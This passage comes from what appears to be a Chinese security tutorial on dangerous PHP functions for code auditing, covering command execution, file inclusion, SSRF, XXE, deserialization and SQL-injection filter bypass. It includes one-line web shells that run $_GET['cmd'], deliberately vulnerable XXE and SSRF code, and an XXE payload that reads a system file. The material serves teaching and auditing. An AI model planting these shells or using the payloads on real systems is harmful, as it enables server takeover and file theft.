$newfunc(&#39;whoami&#39;);</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193314.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>array_map() 为数组的每个元素应用回调函数</li>
</ul>
<p>array_map()函数将用户自定义的函数作用到数组中的每个值上，并返回用户自定义函数作用后带有新值的数组，这里相当于一种动态调用</p>
<pre tabindex="0"><code>&lt;?php
    $func=$_GET[&#39;func&#39;];
    $cmd=$_GET[&#39;cmd&#39;];
    $array[0]=$cmd;
    $new_array=array_map($func,$array);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194224.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>call_user_func() 把第一个参数作为回调函数调用，其他参数是回调函数的参数</li>
</ul>
<pre tabindex="0"><code>&lt;?php 
    @call_user_func(&#34;assert&#34;,$_GET[&#39;cmd&#39;]);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194550.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>call_user_func_array() 调用回调函数，并将第一个数组参数作为回调函数参数</li>
</ul>
<pre tabindex="0"><code>&lt;?php
    $cmd=$_GET[&#39;cmd&#39;];
    $array[0]=$cmd;
    @call_user_func_array(&#34;assert&#34;,$array);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310194829.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>array_filter() 使用回调函数过滤数组的元素</li>
</ul>
<p>依次将数组中的每个值传递到<code>callback</code>函数，如果<code>callback</code>函数返回<code>true</code>，则数组的当前值会被包含在返回的结果数组中，数组的键名保留不变</p>
<pre tabindex="0"><code>&lt;?php 
    $cmd=$_GET[&#39;cmd&#39;];
    $array1=array($cmd);
    $func =$_GET[&#39;func&#39;];
    array_filter($array1,$func);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195216.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h6 id="命令执行的危险函数" class="heading-element"><span>0.0.0.1.3  命令执行的危险函数</span>
  <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>system() 执行外部程序，并显示输出</li>
</ul>
<p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195355.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<pre tabindex="0"><code>&lt;?php
    system($_GET[&#39;cmd&#39;]);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195435.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>exec() 执行外部程序</li>
</ul>
<p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195543.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<pre tabindex="0"><code>&lt;?php 
    echo exec(&#34;whoami&#34;);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195624.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>shell_exec() 通过shell环境执行命令，并将完整的输出以字符串的方式返回</li>
</ul>
<pre tabindex="0"><code>&lt;?php 
    echo shell_exec(&#34;whoami&#34;);
?&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310195851.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>passthru() 执行外部程序并且显示原始输出</li>
</ul>
<pre tabindex="0"><code>&lt;?php 
    passthru(&#34;whoami&#34;);
?&gt;</code></pre><ul>
<li>proc_open() 执行一个命令，并且打开用来输入/输出的文件指针</li>
<li>pcntl_exec() 在当前进程空间执行指定程序</li>
<li>popen() 打开进程文件指针</li>
<li>反引号，实质上还是调用的<code>shell_exec()</code>函数，在CTF题目里面有的时候会忘记过滤导致直接拿到flag</li>
</ul>
<h6 id="文件包含的危险函数" class="heading-element"><span>0.0.0.1.4  文件包含的危险函数</span>
  <a href="#%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><p>php中包含的函数一共有四个，主要作用为包含并运行指定文件</p>
<ul>
<li>require() 函数</li>
<li>inclue() 函数</li>
<li>require_once() 函数</li>
<li>include_once() 函数</li>
</ul>
<p><code>include()</code>与<code>require_once()</code>主要的区别是：<code>include()</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续运行；而<code>require()</code>函数出现错误时，会直接报错并退出程序的执行</p>
<p><code>require_once()</code>和<code>include_once()</code>，显然表示的是文件只包含一次的意思，避免函数重定义和变量重新赋值等问题</p>
<p>文件包含还分为了本地文件包含和远程文件包含，这里就不再进行赘述</p>
<p>当被包含文件可控的情况下，我们可以包含任意文件，从而达到GetShell的目的，也可以使用filter伪协议读取文件内容，关于php伪协议会在后面的文章进行介绍</p>
<h6 id="ssrf的危险函数" class="heading-element"><span>0.0.0.1.5  SSRF的危险函数</span>
  <a href="#ssrf%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>file_get_contents()</li>
<li>fsockopen()</li>
<li>curl_exec()</li>
<li>fopen()</li>
<li>readfile()</li>
<li>&hellip;
函数使用不当会造成SSRF漏洞</li>
</ul>
<p>利用的相关协议：</p>
<ul>
<li>file协议: 在有回显的情况下，利用file协议可以读取任意的内容</li>
<li>dict协议: 泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
<li>gopher协议: gopher支持发出GET,POST请求，可以通过抓包然后构造成gopher协议的请求</li>
<li>http/s: 探测内网主机存活</li>
</ul>
<p>一个简单的<code>file_get_contents()</code>案例</p>
<pre tabindex="0"><code>&lt;?php
    $url = $_GET[&#39;url&#39;];;
    echo file_get_contents($url);
?&gt;</code></pre><p>直接在本地环境上测试了，使用file协议读一下<code>system.ini</code>文件
<a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311003419.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h6 id="xxe的危险函数" class="heading-element"><span>0.0.0.1.6  XXE的危险函数</span>
  <a href="#xxe%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><p>XXE指XML外部实体注入</p>
<p>当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取，系统命令执行，内网端口探测，攻击内网网站等危害</p>
<p>这类漏洞可以根据危险函数逆推回去，危险函数有:</p>
<ul>
<li>simplexml_load_string() 转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li>
<li>asXML()</li>
<li>simplexml_load_file()</li>
<li>simplexml_import_dom()</li>
<li>&hellip;</li>
</ul>
<p>本地搭建一个存在XXE的环境</p>
<pre tabindex="0"><code>&lt;?php 
    error_reporting(0); //禁用外部实体注入 设置为false 相当于不禁用 
    libxml_disable_entity_loader (false); 
    //php://input ===&gt; post请求体的内容 
    $xmlfile = file_get_contents(&#39;php://input&#39;); 
    //exit(-1); 
    //创建一个DOMDocument类型的对象 
    $dom = new DOMDocument(); 
    //loadXML 从字符串中读取，生成一个DOMDocument类型的对象 
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    //var_dump($dom); 
    //exit(-1); 
    //把一个DOMDocument类型的对象转发成一个simpleXML类型的对象 
    $creds = simplexml_import_dom($dom); //因为存在SIMPLEXMLelement存在__toString__魔术方法， //因此可以直接打印 
    echo $creds; 
?&gt;</code></pre><p>payload为</p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;!DOCTYPE creds [ 
&lt;!ENTITY goodies SYSTEM 
&#34;php://filter/read=convert.base64-encode/resource=C:/Windows/system.ini&#34;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311123228.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>成功读取base64加密后的<code>system.ini</code>文件内容</p>
<p>php防御手段：</p>
<blockquote>
<p>设置<code>libxml_disable_entity_loader</code>=TRUE来禁用外部实体</p>
</blockquote>
<h6 id="文件操作相关函数" class="heading-element"><span>0.0.0.1.7  文件操作相关函数</span>
  <a href="#%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><p>文件操作无外乎<code>增删改查</code>，在不同场景下利用手法不同</p>
<ul>
<li>增,改 : 写入shell相关的内容</li>
<li>删 : 删除.lock文件导致CMS重新安装</li>
<li>查 读取配置等文件，拿到敏感信息</li>
<li>&hellip;</li>
</ul>
<p>文件操作的函数有很多:</p>
<ul>
<li>unlink() 传入文件名删除文件</li>
<li>copy() 复制文件</li>
<li>highlight_file() 对php文件语法高亮显示</li>
<li>show_source() highlight_file的别名</li>
<li>file_get_contents()</li>
<li>fopen()</li>
<li>parse_ini_file()</li>
<li>readfile()</li>
<li>fread()</li>
<li>&hellip;</li>
</ul>
<h6 id="敏感信息的危险函数" class="heading-element"><span>0.0.0.1.8  敏感信息的危险函数</span>
  <a href="#%e6%95%8f%e6%84%9f%e4%bf%a1%e6%81%af%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>phpinfo() 输出关于php配置的信息</li>
<li>getenv() 获取一个环境变量的值</li>
<li>get_current_user() 获取当前php脚本所有者的名称</li>
<li>getlastmod() 获取页面最后修改的时间</li>
<li>ini_get() 获取一个配置选项的值</li>
<li>glob() 寻找与模式匹配的文件路径</li>
</ul>
<h6 id="反序列化危险函数" class="heading-element"><span>0.0.0.1.9  反序列化危险函数</span>
  <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>序列化函数 <code>serialize()</code></li>
<li>反序列化函数 <code>unserialize()</code></li>
<li>php十六个魔术方法，魔术方法命名是以符号__开头的
<ul>
<li><code>__construct()</code> 类的构造函数</li>
<li><code>__destruct()</code> 类的析构函数</li>
<li><code>__call()</code> 在对象中调用一个不可访问方法时调用</li>
<li><code>__callStatic()</code> 用静态方式中调用一个不可访问方法时调用</li>
<li><code>__get()</code> 获得一个类的成员变量时调用</li>
<li><code>__set()</code>设置一个类的成员变量时调用</li>
<li><code>__isset()</code> 当对不可访问属性调用isset()或empty()时调用</li>
<li><code>__unset()</code> 当对不可访问属性调用unset()时被调用。</li>
<li><code>__sleep()</code> 执行serialize()时，先会调用这个函数</li>
<li><code>__wakeup()</code> 执行unserialize()时，先会调用这个函数</li>
<li><code>__toString()</code> 类被当成字符串时的回应方法</li>
<li><code>__invoke()</code> 调用函数的方式调用一个对象时的回应方法</li>
<li><code>__set_state()</code> 调用var_export()导出类时，此静态方法会被调用。</li>
<li><code>__clone()</code> 当对象复制完成时调用</li>
<li><code>__autoload()</code> 尝试加载未定义的类</li>
<li><code>__debugInfo()</code> 打印所需调试信息</li>
</ul>
</li>
</ul>
<p>关于如何利用反序列化漏洞，取决于应用程序的逻辑、可用的类和魔法方法。</p>
<p><code>unserialize</code>的参数用户可控，攻击者可以构造恶意的序列化字符串。当应用程序将恶意字符串反序列化为对象后，也就执行了攻击者指定的操作，如代码执行、任意文件读取等</p>
<h6 id="sql注入的危险函数" class="heading-element"><span>0.0.0.1.10  SQL注入的危险函数</span>
  <a href="#sql%e6%b3%a8%e5%85%a5%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>mysql_query() 发送一条MySQL查询</li>
<li>mysql_connect() 打开一个到MySQL服务器的链接</li>
<li>sprintf() 将格式化的字符串写入变量中</li>
</ul>
<pre tabindex="0"><code>sprintf(format,arg1,arg2,arg++)</code></pre><p><code>arg1</code>、<code>arg2</code>、<code>arg++</code> 参数将被插入到主字符串中的百分号（%）符号处。该函数是逐步执行的。在第一个 % 符号处，插入 arg1，在第二个 % 符号处，插入 arg2，依此类推。</p>
<p>注释：如果 % 符号多于 arg 参数，则您必须使用占位符。占位符位于 % 符号之后，由数字和 &ldquo;$&rdquo; 组成。</p>
<p>可以利用sprintf()绕过一些过滤字符的函数，例如在如下场景中</p>
<pre tabindex="0"><code>&lt;?php 
    error_reporting(0);
    $name = $_GET[&#39;name&#39;];
    $name = mysql_escape_string(stripslashes($name));
    $sql = sprintf(&#34;select * from product where name = &#39;$name&#39; and adddate &lt;= &#39;%s&#39; limit 1&#34;,date(&#34;Y-m-d H:i:s&#34;));
    echo $sql;
?&gt;</code></pre><p>我们的单引号被过滤了
